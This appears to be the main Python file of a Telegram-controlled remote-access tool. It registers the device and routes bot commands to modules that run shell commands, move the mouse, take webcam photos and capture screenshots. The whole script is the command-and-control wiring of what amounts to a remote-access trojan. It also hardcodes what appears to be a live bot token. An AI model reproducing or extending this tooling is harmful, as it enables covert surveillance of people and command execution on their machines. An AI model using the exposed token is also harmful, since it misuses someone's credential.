from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler
from device_management import start, clients, handle_message, register_bot_device
from exec_commands import exec_command
from control_functions import mouse_control, button_callback
from media_capture import take_photo, take_screenshot
from helpers import help_command

# Your bot token
TOKEN = '6955642805:AAHbixsrUcPRR1FHEc-on-eUs33OdaEbmsI'

def main() -> None:
    register_bot_device()

    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("clients", clients))
    application.add_handler(CommandHandler("exec", exec_command))
    application.add_handler(CommandHandler("mouse", mouse_control))
    application.add_handler(CommandHandler("photo", take_photo))
    application.add_handler(CommandHandler("screenshot", take_screenshot))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))

    application.run_polling()

if __name__ == '__main__':
    main()
